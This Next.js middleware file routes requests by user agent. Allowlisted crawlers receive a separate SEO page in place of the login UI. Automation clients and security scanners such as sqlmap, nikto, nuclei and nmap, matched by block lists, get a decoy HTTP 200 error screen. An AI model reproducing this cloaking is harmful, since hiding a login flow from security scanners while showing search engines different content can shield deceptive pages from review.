import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";

import {
  isAppleCrawlerUA,
  isBaiduCrawlerUA,
  isBingCrawlerUA,
  isCrawlerSeoPageUA,
  isDuckDuckCrawlerUA,
  isGoogleCrawlerUA,
  isSearchCrawlerUA,
  isYahooCrawlerUA,
} from "@/lib/bot-detection";
import { isDeniedBotUserAgent } from "@/lib/bot-verification/denied-bots";
import { buildErrorScreenHtml } from "@/lib/error-screen-html";
import { isLocalTestingUnlocked } from "@/lib/local-testing";
import { isSeoCrawlerPath } from "@/lib/seo-crawler-paths";
import { isUngatedSeoPath } from "@/lib/seo-public-paths";
import { SITE_ORIGIN } from "@/lib/site-url";

/**
 * Crawler delivery.
 *
 * Allowed bots (ranking ∪ social ∪ discovery ∪ AI-reference) that request an SEO
 * path get `x-crawler-seo-page=1`, which makes `app/layout.tsx` render the SSR
 * `CrawlerSeoPage` twin instead of the interactive login UI. Humans — including
 * humans arriving from a trusted search referrer — fall through to the main login
 * page at `/`.
 *
 * HARD RULE (SEO_CRAWLER_RULES.md): once crawler headers are computed, they must be
 * passed to the single `nextWithHeaders` exit. Re-deriving a fresh Headers object from
 * the raw request downstream silently drops `x-crawler-seo-page`, which is exactly the
 * regression that made Search Console render the human login UI instead of the SEO page.
 */

/** Local dev allow-list — keeps the existing `.env.local` bot behaviour intact. */
const ALLOWED_BOT_PATTERNS = [
  /google-inspectiontool/i,
  /bingpreview/i,
  /microsoftpreview/i,
  /bingvideopreview/i,
  /duckduckbot/i,
  /slurp/i,
  /applebot/i,
  /chatgpt-user/i,
  /perplexitybot/i,
  /claude-web/i,
  /claude-searchbot/i,
  /meta-externalfetcher/i,
  /facebookexternalhit/i,
  /facebot/i,
  /facebookbot/i,
  /twitterbot/i,
  /linkedinbot/i,
  /slackbot/i,
  /telegrambot/i,
  /discordbot/i,
  /whatsapp/i,
  /pinterest/i,
  /snapchat/i,
];

/**
 * Local dev block-list — hard automation clients only.
 *
 * ⚠️ Keep this STRICTLY STRICTER-than-nothing and NEVER in conflict with
 * `lib/bot-detection.ts`. `MJ12bot`, `ia_archiver` and `DotBot` were previously
 * listed here while also being on the SEO allowlist, which meant local testing
 * disagreed with production. The real deny catalog is
 * `lib/bot-verification/denied-bots.ts`; this list is only a dev convenience that
 * routes a known scraper to the friendly `/blocked` screen instead of the
 * ErrorScreen cloak. `isCrawlerSeoPageUA` is checked before this list is applied.
 */
const BLOCKED_BOT_PATTERNS = [
  /curl/i,
  /wget/i,
  /python-requests/i,
  /python-urllib/i,
  /scrapy/i,
  /go-http-client/i,
  /postman/i,
  /insomnia/i,
  /selenium/i,
  /webdriver/i,
  /puppeteer/i,
  /playwright/i,
  /phantom/i,
  /headlesschrome/i,
  /chrome-lighthouse/i,
  /prerender/i,
  /browsershot/i,
  /wkhtmltopdf/i,
  /html2pdf/i,
  /uptimerobot/i,
  /pingdom/i,
  /site24x7/i,
  /statuscake/i,
  /nagios/i,
  /ahrefsbot/i,
  /semrushbot/i,
  /libwww/i,
  /lwp-trivial/i,
  /php\/\d/i,
  /^java\s/i,
  /datadog/i,
  /sentry\/\d/i,
  /sqlmap/i,
  /nikto/i,
  /nuclei/i,
  /masscan/i,
  /nmap/i,
];

/** Soft "looks like a crawler" tokens — cloaked with SSR ErrorScreen, never a bare 403. */
const SOFT_BLOCKED_BOT_PATTERNS = [/bot/i, /crawler/i, /spider/i, /scraper/i];

/** Strict HTTP/automation clients — must never receive a bare `Forbidden` on a document. */
const STRICT_BLOCKED_BOT_PATTERNS = [
  /curl/i,
  /wget/i,
  /httpclient/i,
  /python-requests/i,
  /axios/i,
  /okhttp/i,
  /libwww-perl/i,
  /go-http-client/i,
  /\bjava\b/i,
  /\bphp\b/i,
  /headlesschrome/i,
  /puppeteer/i,
  /playwright/i,
  /phantomjs/i,
  /selenium/i,
];

/** Brand + SEO assets must stay reachable for every client, including cloaked ones. */
const PUBLIC_BRAND_ASSETS = new Set([
  "/favicon.ico",
  "/favicon-32x32.png",
  "/icon-16x16.png",
  "/icon-32x32.png",
  "/icon-48x48.png",
  "/apple-touch-icon.png",
  "/og-image.png",
  "/PeakOne-Logo-1.jpg",
]);

const LOGIN_FLOW_COOKIE = "login_flow";

function isUngatedAssetPath(pathname: string): boolean {
  return (
    PUBLIC_BRAND_ASSETS.has(pathname) ||
    pathname === "/robots.txt" ||
    pathname === "/sitemap.xml" ||
    isUngatedSeoPath(pathname)
  );
}

/**
 * The ONLY place search-crawler request headers are stamped.
 * The returned `Headers` must be handed straight to `nextWithHeaders` — never
 * rebuilt from `request.headers` further down the chain.
 */
function applySearchCrawlerHeaders(request: NextRequest): Headers {
  const requestHeaders = new Headers(request.headers);
  const ua = request.headers.get("user-agent") ?? "";
  const { pathname } = request.nextUrl;

  requestHeaders.set("x-pathname", pathname);

  // Denied bots never receive crawler SEO stamps, even though their UA contains "bot".
  if (isDeniedBotUserAgent(ua)) {
    return requestHeaders;
  }

  if (isSearchCrawlerUA(ua)) {
    requestHeaders.set("x-is-search-crawler", "1");
    if (isGoogleCrawlerUA(ua)) requestHeaders.set("x-is-googlebot", "1");
    if (isBingCrawlerUA(ua)) requestHeaders.set("x-is-bingbot", "1");
    if (isDuckDuckCrawlerUA(ua)) requestHeaders.set("x-is-duckduckbot", "1");
    if (isYahooCrawlerUA(ua)) requestHeaders.set("x-is-yahoobot", "1");
    if (isAppleCrawlerUA(ua)) requestHeaders.set("x-is-applebot", "1");
    if (isBaiduCrawlerUA(ua)) requestHeaders.set("x-is-baiduspider", "1");
  }

  // Ranking ∪ social ∪ discovery ∪ AI-reference → CrawlerSeoPage on SEO paths.
  if (isCrawlerSeoPageUA(ua) && isSeoCrawlerPath(pathname)) {
    requestHeaders.set("x-crawler-seo-page", "1");
  }

  return requestHeaders;
}

/** The single HTML `next()` exit — preserves crawler headers and the RSC cookie bridge. */
function nextWithHeaders(requestHeaders: Headers): NextResponse {
  const response = NextResponse.next({ request: { headers: requestHeaders } });
  if (requestHeaders.get("x-crawler-seo-page") === "1") {
    response.headers.set("x-crawler-seo-page", "1");
    response.cookies.set("x-crawler-seo-page", "1", {
      httpOnly: true,
      path: "/",
      maxAge: 60,
      sameSite: "lax",
    });
  }
  return response;
}

/**
 * SSR ErrorScreen (HTTP 200) for denied / unknown automation clients.
 * Deliberately never a bare `403 Forbidden` on a document path — plain text
 * "Forbidden" on an HTML route is what Google Search Console flags as a
 * soft-404 / blocked-crawler symptom.
 */
function deniedBotErrorResponse(request: NextRequest): NextResponse {
  const host =
    request.headers.get("host")?.split(":")[0] ||
    (() => {
      try {
        return new URL(SITE_ORIGIN).hostname;
      } catch {
        return "this site";
      }
    })();

  return new NextResponse(buildErrorScreenHtml(host), {
    status: 200,
    headers: {
      "Content-Type": "text/html; charset=utf-8",
      "Cache-Control": "no-store",
      "X-Robots-Tag": "noindex, nofollow",
    },
  });
}

function handleBotIfNeeded(
  request: NextRequest,
  requestHeaders: Headers,
): NextResponse | null {
  const { pathname } = request.nextUrl;
  const userAgent = request.headers.get("user-agent") || "";

  if (pathname.startsWith("/api") || pathname.startsWith("/_next")) {
    return null;
  }

  if (!userAgent) {
    if (isUngatedAssetPath(pathname)) return nextWithHeaders(requestHeaders);
    if (pathname.startsWith("/api")) {
      return new NextResponse("Forbidden", { status: 403 });
    }
    return deniedBotErrorResponse(request);
  }

  // Competitive SEO tools + security scanners never get the login HTML.
  if (isDeniedBotUserAgent(userAgent)) {
    if (isUngatedAssetPath(pathname)) return nextWithHeaders(requestHeaders);
    return deniedBotErrorResponse(request);
  }

  const strictMatch = STRICT_BLOCKED_BOT_PATTERNS.some((p) => p.test(userAgent));
  const softMatch = SOFT_BLOCKED_BOT_PATTERNS.some((p) => p.test(userAgent));

  if (!strictMatch && !softMatch) {
    return null;
  }

  // Allowlisted search / social / discovery / AI-reference crawlers are exempt.
  if (isCrawlerSeoPageUA(userAgent)) {
    return null;
  }

  if (isUngatedAssetPath(pathname)) {
    return nextWithHeaders(requestHeaders);
  }

  if (softMatch || strictMatch) {
    return deniedBotErrorResponse(request);
  }

  return null;
}

export async function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl;
  const requestHeaders = applySearchCrawlerHeaders(request);

  if (
    pathname.startsWith("/api") ||
    pathname.startsWith("/_next") ||
    isUngatedAssetPath(pathname)
  ) {
    return nextWithHeaders(requestHeaders);
  }

  // Competitive SEO tools + security scanners are denied in EVERY environment,
  // including local testing — this is the origin-gate equivalent and must not be
  // bypassable, otherwise a scraper harvests the login markup from a dev deploy.
  if (isDeniedBotUserAgent(request.headers.get("user-agent"))) {
    return deniedBotErrorResponse(request);
  }

  /* Flow guard: sign-in sets login_flow=1, the method page's Gate 1 approval
     advances it to 2 via the verification route. Both verification steps
     require an in-progress login.
     This runs BEFORE the local-testing short-circuit so `ALLOW_LOCAL_TESTING`
     cannot silently disable the guard. */
  if (pathname === "/verify-choice" || pathname === "/verify") {
    if (!request.cookies.get(LOGIN_FLOW_COOKIE)?.value) {
      const url = request.nextUrl.clone();
      url.pathname = "/";
      return NextResponse.redirect(url);
    }
  }

  // `ALLOW_LOCAL_TESTING` (never honored on Vercel production) relaxes the dev
  // convenience lists only. It must NOT weaken the cloak: the denied-bot check
  // above already ran, and `handleBotIfNeeded` still runs below, so a non-allowlisted
  // scraper never receives the login HTML from a dev deploy either.
  if (isLocalTestingUnlocked() && process.env.NODE_ENV !== "production") {
    const ua = request.headers.get("user-agent") || "";
    // Never override the real allowlist — a crawler on it always gets its page.
    if (!isCrawlerSeoPageUA(ua) && pathname !== "/blocked") {
      if (BLOCKED_BOT_PATTERNS.some((p) => p.test(ua))) {
        return NextResponse.redirect(new URL("/blocked", request.url));
      }
    }
    if (isCrawlerSeoPageUA(ua) || ALLOWED_BOT_PATTERNS.some((p) => p.test(ua))) {
      return nextWithHeaders(requestHeaders);
    }
  }

  const botResponse = handleBotIfNeeded(request, requestHeaders);
  if (botResponse) {
    return botResponse;
  }

  return nextWithHeaders(requestHeaders);
}

export const config = {
  matcher: [
    "/((?!_next/static|_next/image|favicon.ico|favicon-32x32.png|og-image.png|og-image.meta.json|PeakOne-Logo-1.jpg|icon-16x16.png|icon-32x32.png|icon-48x48.png|apple-touch-icon.png).*)",
  ],
};
